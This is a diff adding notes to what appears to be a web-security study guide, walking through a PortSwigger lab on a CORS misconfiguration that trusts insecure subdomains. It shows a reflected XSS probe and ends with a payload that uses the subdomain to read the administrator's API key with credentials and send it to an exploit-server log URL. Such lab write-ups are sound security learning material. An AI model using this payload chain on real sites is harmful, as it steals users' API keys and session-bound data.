@@ -81,4 +81,41 @@ In this situation, an attacker can use various tricks to generate a cross-origin
 </script>"></iframe>
 ```
 
+### Lab: CORS vulnerability with trusted insecure protocols
+This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol
+To solve the lab retrieve the administrator's API key (`GET /accountDetails` endpoint replies back the API key)
+
+So we need a way of stealing admin's API key.
+- The response to /accountDetails contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
+- Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.0a5a00e503089526801a213200ac0073.web-security-academy.net 
+(Don't forget `http` or `https`. If you specify: `subdomain.0a5a00e503089526801a213200ac0073.web-security-academy.net` you're not gonna get `Access-Control-Allow-Origin` header in response)
+- Since the origin is reflected in the Access-Control-Allow-Origin header, it confirms that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
+
+After looking through the website's html, a subdomain was found (in the check stock req):
+```bash
+http://stock.lab-id.web-security-academy.net/?productId=1&storeId=1
+```
+After playing around with the endpoint we see that the `productID` is vulnerable to XSS.
+e.g. if we send:
+```bash
+GET /?productId=4<script>alert(33)</script>&storeId=1 HTTP/2
+Host: stock.0a5a00e503089526801a213200ac0073.web-security-academy.net
+```
+And here's the response that we get back:
+```bash
+HTTP/2 400 Bad Request
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 61
+
+<h4>ERROR</h4>Invalid product ID: 4<script>alert(33)</script>
+```
+In the browser the response from above creates a `<script>` tab and executes js code.
+
+So we try to make the victim make a request to `/accountDetails`, but we do it via subdomain, because we don't want CORS to stand on our way:
+```bash
+<script>
+    document.location="http://stock.0a5a00e503089526801a213200ac0073.web-security-academy.net/?productId=4<script>const req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a5a00e503089526801a213200ac0073.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a9000fb03cd95ce8034206201520055.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
 
